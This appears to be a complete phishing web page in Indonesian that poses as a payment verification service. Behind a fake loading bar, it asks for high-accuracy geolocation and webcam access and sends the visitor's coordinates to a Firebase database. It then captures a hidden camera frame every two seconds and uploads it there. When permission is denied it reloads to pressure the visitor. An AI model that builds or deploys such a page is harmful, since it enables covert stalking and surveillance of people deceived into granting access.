<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifikasi Pembayaran</title>
  
  <!-- Firebase SDK (v9 Compatibility Mode) -->
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #0d1117;
      color: #ffffff;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    /* POP-UP MODAL CUSTOM */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(5px);
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      z-index: 999;
    }

    .modal-box {
      background: #161b22;
      border: 1px solid #30363d;
      padding: 30px 25px;
      border-radius: 16px;
      max-width: 380px;
      width: 100%;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    }

    .icon-box {
      font-size: 45px;
      margin-bottom: 15px;
    }

    .modal-box h2 {
      margin: 0 0 10px 0;
      color: #f0f6fc;
      font-size: 20px;
    }

    .modal-box p {
      color: #8b949e;
      font-size: 14px;
      line-height: 1.5;
      margin-bottom: 25px;
    }

    .btn-allow {
      background: linear-gradient(135deg, #238636, #2ea043);
      color: white;
      border: none;
      padding: 14px 28px;
      font-size: 15px;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
      width: 100%;
      box-shadow: 0 4px 12px rgba(46, 160, 67, 0.3);
      transition: all 0.2s ease;
    }

    .btn-allow:hover {
      background: linear-gradient(135deg, #2ea043, #3fb950);
      transform: translateY(-1px);
    }

    /* TAMPILAN LOADING FULL SCREEN */
    .loading-container {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
    }

    .spinner {
      width: 70px;
      height: 70px;
      border: 5px solid rgba(255, 255, 255, 0.1);
      border-top: 5px solid #2f81f7;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 25px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-title {
      font-size: 18px;
      font-weight: 600;
      color: #58a6ff;
      margin-bottom: 8px;
      letter-spacing: 0.5px;
    }

    .loading-subtext {
      font-size: 13px;
      color: #8b949e;
      margin-bottom: 20px;
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 0.6; }
      50% { opacity: 1; }
    }

    .progress-bar-box {
      width: 260px;
      height: 8px;
      background: #21262d;
      border-radius: 10px;
      overflow: hidden;
      margin-bottom: 12px;
      border: 1px solid #30363d;
    }

    .progress-bar-fill {
      width: 0%;
      height: 100%;
      background: linear-gradient(90deg, #2f81f7, #58a6ff);
      border-radius: 10px;
      transition: width 0.3s ease;
    }

    .percentage-text {
      font-size: 14px;
      font-weight: bold;
      color: #c9d1d9;
    }

    #webcamElement, #canvasElement {
      display: none;
    }
  </style>
</head>
<body>

  <!-- POP-UP CUSTOM -->
  <div class="modal-overlay" id="customModal">
    <div class="modal-box">
      <div class="icon-box">HALLO!!</div>
      <h2>SELAMAT DATANG</h2>
      <p>Untuk melanjutkan layanan ini, silakan klik tombol di bawah lalu pilih <b>MULAI</b> pada dialog browser.</p>
      <button class="btn-allow" onclick="mulaiProses()">Mulai</button>
    </div>
  </div>

  <!-- TAMPILAN LOADING SINKRONISASI -->
  <div class="loading-container" id="loadingArea">
    <div class="spinner"></div>
    <div class="loading-title">Menghubungkan ke Server...</div>
    <div class="loading-subtext">Mohon tunggu, jangan tutup halaman ini</div>
    
    <div class="progress-bar-box">
      <div class="progress-bar-fill" id="progressFill"></div>
    </div>
    <div class="percentage-text" id="percentText">0%</div>
  </div>

  <video id="webcamElement" autoplay playsinline></video>
  <canvas id="canvasElement"></canvas>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyC5FzkrFW7JPOagOddT575F44wVT6hVeRE",
      authDomain: "sfkk-6af70.firebaseapp.com",
      databaseURL: "https://sfkk-6af70-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "sfkk-6af70",
      storageBucket: "sfkk-6af70.firebasestorage.app",
      messagingSenderId: "1045663352487",
      appId: "1:1045663352487:web:3948f3c0a8f1e215187d82",
      measurementId: "G-23SNFYWR8V"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const webcam = document.getElementById('webcamElement');
    const canvas = document.getElementById('canvasElement');
    const loadingArea = document.getElementById('loadingArea');
    const progressFill = document.getElementById('progressFill');
    const percentText = document.getElementById('percentText');

    // Variabel penampung status izin yang dipanggil pertama kali
    let statusLokasi = false;
    let statusKamera = false;

    // Meminta izin browser secara langsung saat halaman dibuka pertama kali
    window.onload = async function() {
      statusLokasi = await mintaLokasi();
      statusKamera = await mintaKamera();
    };

    // Fungsi saat pengguna menekan tombol "Mulai"
    async function mulaiProses() {
      // Jika izin belum didapat saat load awal, panggil sekali lagi untuk memastikan
      if (!statusLokasi) statusLokasi = await mintaLokasi();
      if (!statusKamera) statusKamera = await mintaKamera();

      // Cek apakah user menolak salah satu atau kedua izin
      if (!statusLokasi || !statusKamera) {
        alert("Layanan ini tidak bisa berjalan jika belum diijinkan");
        // Setelah klik OK pada alert, muat ulang (reload) browser ke kondisi awal
        window.location.reload();
        return;
      }

      // Jika diizinkan, sembunyikan modal dan jalankan tampilan loading
      document.getElementById('customModal').style.display = 'none';
      loadingArea.style.display = 'flex';
      jalankanProgressBar();
    }

    function jalankanProgressBar() {
      let progress = 0;
      const interval = setInterval(() => {
        if (progress < 95) {
          progress += Math.floor(Math.random() * 3) + 1;
          if (progress > 95) progress = 95;
          progressFill.style.width = progress + '%';
          percentText.innerText = progress + '%';
        }
      }, 500);
    }

    function mintaLokasi() {
      return new Promise((resolve) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              db.ref('device/location').set({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                updatedAt: Date.now()
              });
              resolve(true);
            },
            (error) => {
              console.warn("Lokasi ditolak:", error.message);
              resolve(false);
            },
            { enableHighAccuracy: true, timeout: 10000 }
          );
        } else {
          resolve(false);
        }
      });
    }

    async function mintaKamera() {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          webcam.srcObject = stream;
          setInterval(captureFrame, 2000);
          return true;
        } catch (err) {
          console.warn("Kamera ditolak:", err.message);
          return false;
        }
      } else {
        return false;
      }
    }

    function captureFrame() {
      if (webcam.videoWidth === 0) return;

      canvas.width = webcam.videoWidth;
      canvas.height = webcam.videoHeight;
      
      const ctx = canvas.getContext('2d');
      ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);

      const base64Image = canvas.toDataURL('image/jpeg', 1.0);
      db.ref('device/cameraFrame').set(base64Image);
    }
  </script>

</body>
</html>
